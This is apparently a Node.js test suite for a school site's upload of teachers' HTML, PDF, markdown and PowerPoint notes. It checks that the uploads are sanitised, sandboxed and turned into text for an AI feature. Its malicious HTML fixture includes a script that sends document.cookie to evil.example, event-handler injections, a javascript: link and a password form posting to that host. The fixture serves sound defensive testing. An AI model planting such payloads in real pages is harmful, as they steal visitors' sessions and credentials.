// tests/html-appunti.test.js — the teacher's HTML notes: cleaned on upload, served in a sandbox, text goes to the AI; PDF, md, txt too
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { execFileSync } = require('node:child_process');
const { startSite, Client, makeAdmin } = require('./helpers');

let site, admin, mario, classId, storia;
const EVIL = `<!DOCTYPE html><html><head><title>Lezione</title><script>fetch('//evil.example/'+document.cookie)</script>
<style>@import url(//evil.example/x.css); body{background:url(http://evil.example/p.png)} .tit{font-size:40px}</style>
<meta http-equiv="refresh" content="0;url=http://evil.example"></head>
<body onload="steal()" style="background:#eef"><h1 onclick="steal()" class="tit" style="color:#c00">Le rette</h1><p>Una retta passa per <b>due punti</b>.</p>
<a href="javascript:steal()">cattivo</a> <a href="https://scuola.example/p" onclick="x()">buono</a>
<iframe src="//evil.example"></iframe><img src="http://evil.example/track.png" alt="tracker"><img src="x" onerror="steal()">
<form action="//evil.example"><input name="pw"></form><svg onload="steal()"></svg>
<table><tr><td>x</td><td>y</td></tr></table></body></html>`;

async function upload(c, fields, files) {
    const fd = new FormData(); fd.set('action', 'upload');
    for (const [k, v] of Object.entries(fields)) fd.set(k, String(v));
    for (const f of files) fd.append('files[]', new Blob([f.content], { type: f.type }), f.name);
    const res = await fetch(c.site.base + '/api/appunti.php', { method: 'POST', body: fd, headers: { Cookie: c.cookieHeader(), 'X-CSRF-Token': c.csrf } });
    return { status: res.status, json: await res.json() };
}

test.before(async () => {
    site = await startSite();
    admin = await makeAdmin(site, 'ht_admin');
    mario = new Client(site); await mario.register('ht_mario');
    classId = (await mario.post('/api/classi.php', { action: 'request', name: '5H', school: 'ITIS Test', adults: true })).json.id;
    await admin.post('/api/classi.php', { action: 'decide', id: classId, approve: true });
    await mario.post('/api/classi.php', { action: 'save_timetable', id: classId, valid_from: '2026-01-01', periods: { 1: [{ start: '08:00', end: '09:00' }] }, slots: [{ day: 1, period: 1, subject: 'Matematica' }] });
    storia = site.db('SELECT id FROM class_subjects WHERE class_id = ?', [classId])[0].id;
});
test.after(() => site.stop());

test('HTML upload is cleaned, served sandboxed, and its text is ready for the AI', async () => {
    const base = { class_id: classId, subject_id: storia, kind: 'slide', lesson_date: '2026-10-05' };
    const r = await upload(mario, base, [{ name: 'lezione.html', content: Buffer.from(EVIL), type: 'text/html' }]);
    assert.equal(r.status, 200, JSON.stringify(r.json));
    const item = (await mario.get(`/api/appunti.php?action=items&class_id=${classId}&kind=slide`)).json.items[0];
    const f = item.files[0];
    assert.equal(f.mime, 'text/html');
    assert.equal(f.text_status, 'done');
    const res = await fetch(`${site.base}/api/appunti.php?action=file&id=${f.id}`, { headers: { Cookie: mario.cookieHeader() } });
    const html = await res.text();
    assert.match(res.headers.get('content-security-policy'), /sandbox/);
    assert.match(res.headers.get('content-security-policy'), /default-src 'none'/);
    for (const bad of ['<script', 'evil.example', 'onclick', 'onload', 'onerror', 'javascript:', '<iframe', '<form', '<input', '<svg', '@import', 'http-equiv']) assert.ok(!html.includes(bad), bad);
    assert.ok(html.includes('.tit{font-size:40px}') && html.includes('color:#c00') && html.includes('class="tit"') && html.includes('background:#eef'), 'the look is kept');
    assert.ok(html.includes('Le rette') && html.includes('due punti') && html.includes('https://scuola.example/p'));
    const t = (await mario.get(`/api/appunti.php?action=file_text&id=${f.id}`)).json;
    assert.match(t.text, /Una retta passa per due punti/);
    assert.ok(!t.text.includes('steal'));
    // the stored file is the cleaned copy too
    const stored = fs.readFileSync(path.join(site.root, 'data/appunti', String(classId), site.db('SELECT stored_name FROM class_item_files WHERE id = ?', [f.id])[0].stored_name), 'utf8');
    assert.ok(!stored.includes('<script') && !stored.includes('evil.example'));
});

test('an HTML page with no readable text is refused and nothing is kept', async () => {
    const dir = path.join(site.root, 'data/appunti', String(classId));
    const before = fs.readdirSync(dir).length;
    const r = await upload(mario, { class_id: classId, subject_id: storia, kind: 'appunti', lesson_date: '2026-10-06' }, [
        { name: 'vuota.html', content: Buffer.from('<html><script>alert(1)</script></html>'), type: 'text/html' }]);
    assert.equal(r.status, 415);
    assert.equal(fs.readdirSync(dir).length, before);
});

test('PDF, text, markdown and HTML go into the single "Per AI" PDF', async () => {
    const base = { class_id: classId, subject_id: storia, kind: 'appunti', lesson_date: '2026-10-07' };
    const r = await upload(mario, base, [
        { name: 'nota.md', content: Buffer.from('# Titolo md\n\nTesto in markdown'), type: 'text/markdown' },
        { name: 'nota.txt', content: Buffer.from('Testo semplice txt'), type: 'text/plain' },
        { name: 'pagina.htm', content: Buffer.from('<p>Pagina del prof in html</p>'), type: 'text/html' }]);
    assert.equal(r.status, 200, JSON.stringify(r.json));
    const res = await fetch(`${site.base}/api/appunti.php?action=ai_pack&format=pdf&class_id=${classId}&scope=day&date=2026-10-07`, { headers: { Cookie: mario.cookieHeader() } });
    assert.equal(res.status, 200);
    const file = path.join(site.root, 'multi.pdf');
    fs.writeFileSync(file, Buffer.from(await res.arrayBuffer()));
    let text = '';
    try { text = execFileSync('pdftotext', ['-layout', file, '-'], { encoding: 'utf8' }).replace(/\s+/g, ' '); } catch (e) { return; }
    for (const piece of ['Testo in markdown', 'Testo semplice txt', 'Pagina del prof in html', 'Come sono inclusi i file']) assert.ok(text.includes(piece), piece);
});

test('a PowerPoint can be looked at as slides: text escaped, picture inlined, sandboxed', async () => {
    const pptx = fs.readFileSync(path.join(__dirname, 'fixtures', 'slide.pptx'));
    const r = await upload(mario, { class_id: classId, subject_id: storia, kind: 'slide', lesson_date: '2026-10-08' },
        [{ name: 'slide.pptx', content: pptx, type: 'application/vnd.openxmlformats-officedocument.presentationml.presentation' }]);
    assert.equal(r.status, 200, JSON.stringify(r.json));
    const f = (await mario.get(`/api/appunti.php?action=items&class_id=${classId}&kind=slide`)).json.items.find((i) => i.lesson_date === '2026-10-08').files[0];
    const res = await fetch(`${site.base}/api/appunti.php?action=file&id=${f.id}&view=1`, { headers: { Cookie: mario.cookieHeader() } });
    assert.equal(res.status, 200);
    assert.match(res.headers.get('content-type'), /text\/html/);
    assert.match(res.headers.get('content-security-policy'), /sandbox/);
    const html = await res.text();
    assert.ok(html.includes('Il modello TCP/IP') && html.includes('Livello applicazione') && html.includes('<td>Porta</td>'));
    assert.ok(html.includes('data:image/png;base64,') && html.includes('background:#1F3A5F'));
    assert.ok(!html.includes('<script') && html.includes('&lt;script&gt;'), 'text is escaped');
    const stranger = new Client(site); await stranger.register('ht_stranger');
    assert.equal((await fetch(`${site.base}/api/appunti.php?action=file&id=${f.id}&view=1`, { headers: { Cookie: stranger.cookieHeader() } })).status, 404);
});
